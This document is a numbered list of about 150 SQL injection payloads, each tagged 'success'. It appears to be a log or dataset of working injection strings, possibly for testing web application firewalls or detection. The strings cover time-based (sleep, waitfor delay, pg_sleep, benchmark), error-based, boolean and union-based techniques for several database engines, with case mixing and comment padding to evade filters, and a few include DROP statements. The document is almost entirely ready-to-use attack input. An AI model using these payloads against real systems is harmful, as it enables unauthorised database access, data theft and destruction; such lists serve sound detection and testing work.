1 success '1") as\x0camak where \' \' LIKE \' \' and elt(0x4ba LIKE 1210,sleep(5))-- '
2 success '0x1") and 0x21bb=(SeLecT count(*) FRom/**/generate_series(0x1,5000000))-- '
11 success '1") wheRe \'X4\' LIKE \'X4\' AND True aND True waitfor delay \'(SELECT 0):0:5\'-- '
17 success "(sElEct 1)' aNd 0xe7b=(seLEcT count(*) FROM sysibm.systables as\tt1,sysibm.systables aS t2,sysibm.systables As t3) "
21 success "0x1%') && 9892 NOT LIKE 9893# bH"
22 success '-4926" Where/**/\'w\' NOT LIKE \'wq\' OR 0x10f3=5547# Io\r'
32 success '0x1")) AS qhnb\xa0WheRe 1631=1631 && (263=263)*6703-- '
37 success '1") as dfmm where 2543 LIKE 2543 OR 8421=(select count(*) from generate_series(1,5000000))-- '
53 success '0x1") or 7417/**/LIKE (select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- '
57 success '-(SELECT 2411)\x0bOR (8459=8459)*(SELECT 4906)# pxwg '
69 success "0x1))) aNd\xa0elt('RU'='RU' and 1,sleep(5))# ]"
71 success "1)));SElect\x0b(CAsE wHEN ('+}' LIKE '+}' anD True) tHEN 4660 eLse cast(1 As int)/(SELeCt 0x0 From dual) END) FrOM dual--\x0b"
95 success "1')));waitfor/**/delay '0:0:5' and ((('hrta'='hrta "
105 success "1' IN boolean mode);selEct count(*) fROm sysibm.systables aS t1,sysibm.systables AS t2,sysibm.systables As t3-- "
123 success "1') ANd 0xde8=5467-- W"
124 success "0x1;SeLECT lIke('abcdefg',upper(hex(randomblob(500000000/0x2))))-- ygbf "
137 success "0x1') Or extractvalue(0x511,concat(0x5c,0x7171706a71,(seleCT (elt('3J'='3J',1))),0x717a767a71)) "
140 success '1 And/**/elt(4209\tIn (4208,4209,4210),7259)# lwyo/**/p5'
149 success "1' where 5128 LIKE 5128 OR 0 union all select null# P"
176 success '1))\x0bAS aqpy wHere 4027=4027 Or/**/7417=(SelEcT count(*) frOm sysibm.systables aS t1,sysibm.systables/**/AS t2,sysibm.systables aS t3)-- '
177 success '1))) ANd (SElect/**/8189)=(Select count(*) fROM sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables AS t3)--\x0b'
181 success "1');select benchmark(0x4c4b40,md5(0x714e4153))#\n"
188 success '1));SElECT benchmark(5000000,md5(0x714e4153))# '
196 success '(SELECT 1)"))\xa0oR 0x1fdc likE (sElEcT count(*) FRoM generate_series(0x1,0x4c4b40))-- '
203 success "1);waitfor delay/**/'0:0:0x5'-- "
209 success '1 whERe 4003 LIKe 0xfa3 ANd 6689 lIke 6689 union all sELeCT null-- '
215 success "(SELECT 1)' wherE 0x18df<>6368 OR False union/**/all SEleCT null,null,null,null#\n"
220 success "-0x20ed'))) or make_set('6I' NOT LIKE '6Ik' OR False,0x1c11) and ((('bwih' like 'bwih "
223 success '-5726%")) or 6872=0x1ad8 and (("%"=" '
236 success '1);call regexp_substring(repeat(LeFt(crypt_key(char(0x41) OR char(69) or char((SeLECt 83)),null),0x0),0x1dcd6500),null) '
241 success "-6220' union all select\x0b(SELECT 0x5b6),0x5b6# "
259 success '1,iif(1440\tLIKE/**/4612,1,1/0)\x0b'
263 success "-1036')/**/or 0x1ad8=(SELECT 6872)\x0cand ('wvbi'='wvbi "
267 success "-7271'))) or make_set('2J*'='2J*',7185) and ((('mdtw'='mdtw "
279 success '1") wHERE (SELect 0x74e) LIKe/**/0x74e union all\nSeLeCT null,null,null,null,null,null,null,null-- '
303 success '1") as yzzk where 1813=1813 AND (\'"VA,\'=\'"VA,\' AND True)*(SELECT 6703)-- \x0b'
310 success '1")\x0band 4352 NOT LIKE 4353 and ("yqzq"="yqzq '
329 success '1 and elt(0x4ba=1210 OR 5576 LIKE 5577,sleep(5))# macc '
337 success '1"))\nas uels where 9447 LIKE 0x24e7 or 0xa49=dbms_pipe.receive_message(chr(112)||chr(0x41) OR chr(65)||chr(0x67),0x5)-- '
348 success "1%')));SelEcT (CaSE WhEn (0xf0f=3855) tHen 3855 Else 1/(seleCT 0) End)-- "
351 success "0x1));SeleCt likE('abcdefg',upper(hex(randomblob(0x1dcd6500/2))))--\n"
358 success "(seLECt\t0x1)%'));sELect benchmark(0x4c4b40,md5(0x714e4153))# "
362 success '1" and/**/7533=0x1d6d and "dqjp"="dqjp\n'
367 success "1' WhErE (SELECT 0x1bf6)\nnot like 7159;sElEcT count(*) from sysibm.systables AS t1,sysibm.systables/**/aS t2,sysibm.systables As t3-- "
374 success '-9361")) union all SElECt/**/3112#\t'
383 success "1');SELeCT (CAsE WheN (0xf0f liKe 0xf0f) ThEn 3855 else 1/(SeLEct\x0c0) EnD)-- "
388 success "1'||(select 'qwoo' from\x0bdual where 8802=8802 or/**/elt(6272=0x1880,sleep((SELECT 5))))||' "
397 success "(SELECT 1)') or/**/7417=(SeLECt count(*) FroM sysibm.systables as t1,sysibm.systables aS t2,sysibm.systables aS t3)-- "
400 success "0x1')) as vqrt where 0xa52 LIKE 2642 and 0xe7b LIKE (select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- "
405 success "-1579%'))) union all SeLEct 0x1c68# "
419 success '-8200%"))\tunion all seleCT/**/7538,0x1d72,0x1d72# '
444 success '0x1"))) AND (selecT/**/8189)=(seleCt\xa0count(*) FrOM sysibm.systables AS t1,sysibm.systables\naS t2,sysibm.systables aS t3)-- '
445 success '-5903%"))) Or 0xbde=3038 OR False '
450 success '1" wheRE \'w$\n\' lIke \'w$\n\';SeleCT pg_sleep(5)-- '
467 success '1%")))\x0b&& (SElECT\xa00x2192)=(sElECT/**/8594 fROm pg_sleep(0x5))-- '
470 success '1 or 4240=(select 4240 from pg_sleep((SELECT 5)))-- '
479 success "-9355' or/**/6872=6872 and\t'mztk'='mztk "
484 success "1'))) and (3020=(SELECT 3020))*0x1a2f and ((('nhrc'\x0clike/**/'nhrc "
503 success '1)) AS jzzo/**/WHERE 6866=6866 union all sElect null,null,null,null,null# '
522 success '-2936) oR 0x1ad8=6872 '
530 success "0x1'+(select iowv where 'G'='G' AND 'd' NOT LIKE 'dp' AND True and sleep((SELECT 5))# "
532 success '1") where \'( \' NOT LIKE \'( S\' union all select null,null,null,null,null,null,null,null,null-- '
533 success '1")\tWhERe 9959=9959;SelEcT (cAse whEN (0xf0f=(SELECt 3855)) THeN 3855 Else 1/(sEleCt\n0) eND)-- '
537 success '-2838" where \'V4O\\\' LIKE\x0b\'V4O\\\' union all/**/select/**/5442# '
539 success "0x1') WheRe\xa00x66d=0x66d rlike sleep(5)-- "
543 success '1") and (3554 NOT LIKE 3555)*(SELECT 6703) and ("qowc" like "qowc\x0b'
547 success '1") as htyo where 8322=0x2082 and \'G2\' LIKE \'G2\'#\xa0nQ'
557 success "1%') and (0xbcc=3020)*6703 and ('%'=' "
576 success "(SELECT 1)%' or\t8421=(select count(*) from/**/generate_series(0x1,5000000)) and '%'=' "
587 success '-9209%"))) union all/**/SeleCT\x0c(SElecT 0xe98),0xe98,(SelECt 0xe98)-- k'
588 success '1") as fcrx where \'~\' LIKE \'~\' && 2820=5133 '
618 success "1')\x0bAS xhmm WHeRE 0x1f9c=(selECt 0x1f9c) union all sElect null,null,null-- "
631 success "-0x14ec') Or 'k0*' NOT LIKE 'k0*M' AND\x0bTrue Or False# "
634 success '1")));iif(3981 not like 3982 AND 1,1,(SELECT 1)/0)\x0c'
638 success '1") WHErE/**/4129 LIKE 4129 OR (sElECt * froM (SelEcT(sleep(0x5)))ydpu)-- '
645 success "-8028%')))\x0coR\xa00x13b2=5214/**/"
646 success "-5585%'))) or 0x1b4e=0x1e2f "
649 success '-8071)) OR 0x23c8 lIKe 0x109d\x0b'
655 success '(seLecT 1)) wherE 0x25b1 LIKE 9649 aND 0x2192=(SeLeCt 8594\tFROM pg_sleep(0x5))-- '
664 success "0x1%')))  OR  0x1cf9 LIKE (sEleCt count(*) fRoM sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables as t3)-- "
672 success "1%'))) waitfor/**/delay '0:0:5'-- "
682 success '-5640")) || 0x2640 LIKE/**/2728--\t'
684 success "-1760))) OR (3378\nNOT LIKE 3379)*4906 && ((('k'<>'k-' "
688 success "1%')) and\t(9473 LIKE 9473)*0x1a2f and (('%'=' "
695 success "-0x1280'))\tor/**/elt(0x16cb=0x1585,0x1585)/**/and (('iawg'='iawg "
697 success "1'))) and extractvalue(0x1f2e,concat(0x5c,0x7171706a71,(select (elt('[.vW' LIKE '[.vW',1))),0x717a767a71)) and ((('hllf'='hllf\xa0"
712 success '0x1"\nANd/**/8148=LIKe(\'abcdefg\',upper(hex(randomblob(0x1dcd6500/0x2))))--\xa0'
723 success '0x1" Or/**/elt(6272=(SeLect (SELECT 6272)) OR 0,sleep(0x5)) '
751 success "1' and (0xbcc=(SELECT\t3020))*0x1a2f and 'tmng'\nlike 'tmng/**/"
764 success '1;call regexp_substring(repeat(right(char(0xe76),0),500000000),null)\n'
777 success '0x1")));waitfor/**/delay \'0x0:0:5\'\xa0and ((("lpeo"="lpeo '
787 success '1%\');seLeCT CASe When \'"H`\'<>\'"H`C\' TheN 1\x0cELse null ENd-- J'
808 success "1')\x0bwHERE '%Q='='%Q='\x0baNd/**/sleep(0x5)-- "
810 success "0x1'))\x0b OR  8156/**/Like (SeLect count(*) frOm\xa0generate_series(1,5000000))--\t"
812 success "-8023'  or  9269=9269 OR False "
819 success "1'))/**/aS joco wherE\t0xb6a=0xb6a;SelEcT sleep(5)-- "
824 success '0x1%")) && 0x1cbe=(SELECT/**/6986)--\xa0'
855 success "(SeLect 0x1) whERE '&' not like '&L' union all\xa0sElecT null,null,null,null,null,null,null,null,null# "
868 success "-8015) where 3407 IN (3406,3407,3408) || '=0x8' NOT LIKE '=8,'# "
872 success "1'))) or elt(6272=0x1880,sleep(5)) and ((('ayjb'\x0clike 'ayjb "
886 success "1')) as tgso where 2172 IN (2171,2172,2173) OR 0 union all select null,null,null,null-- "
895 success '1%"));sEleCt\tcASE wHeN 5308 LiKE 6745/**/THEn 1 ElSE null eNd--\x0c'
902 success '-3364%")))\xa0union all/**/SeLecT/**/5464-- '
906 success "1')) or 6793=(select/**/6793 from pg_sleep(0x5)) and (('zjun'='zjun "
910 success "1'))) and 0xe7b=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('viad' like 'viad\n"
917 success "1' WheRE '(' NOT LIKE '(5' Or 0 union all SelecT null,null,null-- "
921 success "-6030%') or\t4342\x0bLIKE 4342 OR 0 OR False "
922 success "1' where/**/8584 like\n0x2188 order by 1# "
923 success '1)) as hrks wHERE 7637 lIKE 7637 oR/**/elt(6272=6272 oR 4238=4239 OR 0xafb LIKe 2812,sleep(5))--\x0c'
924 success "iF object_id('dbo.spgeneratedatedimension') is not null DRop procedure [dbo].[spgeneratedatedimension] "
925 success '-5132%")) or/**/3038=(SELECT 3038) '
936 success "1 AND updatexml(0xd41,concat(0x2e,0x7171706a71,(select (elt('cB' LIKE 'cB',1))),0x717a767a71),0x489)-- mwsm\t"
937 success '1" rlike (SELeCt (casE wHeN (2776<>2777) theN 1 eLSe\x0b0x28 EnD)) '
949 success "1'));sElECT (cAse WHEn (9667=6212) TheN 9667 ElSe cast(1 aS int)/(SElecT 0 fRoM dual) eND) froM dual-- "
953 success "1')) as uizu where 1774 LIKE 1774;call/**/regexp_substring(repeat(right(char(0xe76),0),500000000),null)-- "
959 success "1)))\x0cAnd/**/8148 likE Like('abcdefg',upper(hex(randomblob(0x1dcd6500/2))))--\nYd"
965 success "1'||(select 'zzkx'\x0cwHere (SELECT 511) NOT LIKE 512\x0bAnd 9907/**/IN (9906,(SELECT 9907),9908) "
968 success '-8349) union all select 8126,0x1fbe# B%'
976 success "1') WHere 6274=6274 AND 1 oR 0x1fdc=(SelECT/**/count(*) frOm generate_series(1,5000000))-- "
987 success "1%')) AND 0x1ffd=(select count(*) from sysibm.systables/**/as t1,sysibm.systables as t2,sysibm.systables as t3)-- "
1004 success "-8824%')) or make_set(8063 LIKE 8063\x0cAND 1,0x1c11) and (('%'=' "
1009 success '1)) as oywa where 0x15d8=0x15d8 AND True AND True union all select null,null,null,null,null,null# NK'
1029 success "0x1%' or 0x207b=(select count(*) from sysibm.systables as/**/t1,sysibm.systables as t2,sysibm.systables\x0bas t3) and '%'=' "
1051 success '1)) rlike (SeLEct * frOM (SELeCt(sleep(5)))vwyq)# '
1058 success "1' WHERe/**/0x19b7=0x19b7;SelECT cAse When\n0x11b9=8418 THeN 1 Else null/*8`*/END--\t"
1063 success '1%" waitfor delay \'0:0:0x5\'-- '
1067 success "0x1')));sELEcT benchmark(5000000,md5(0x714e4153))# "
1070 success '1 WhERe 5311 Like 5311 rlike (SeLecT * FRoM (sELeCT(sleep(5)))vwyq)# '
1072 success '1%"))) AND \'4UR\' LIKE \'4UR\' '
1073 success "1))\x0bwaitfor/**/delay '0:0:0x5'-- "
1077 success "-4001'))\toR\x0c5634/**/LIKE\x0b0xfcc-- "
1084 success '-0x17dd/**/union all SELEct\t0x1a80-- '
1085 success '1")));SeLecT (CAsE WHEN (0x1234 lIke 0x1234) THeN 4660/**/else cast(1 aS int)/(SElECt 0x0\x0bfroM dual) enD) fRoM dual-- '
1091 success '1)) As eveb WHEre 7567=7567;iF(5316=4416) seLecT 5316 ElSE DRop function vtve-- '
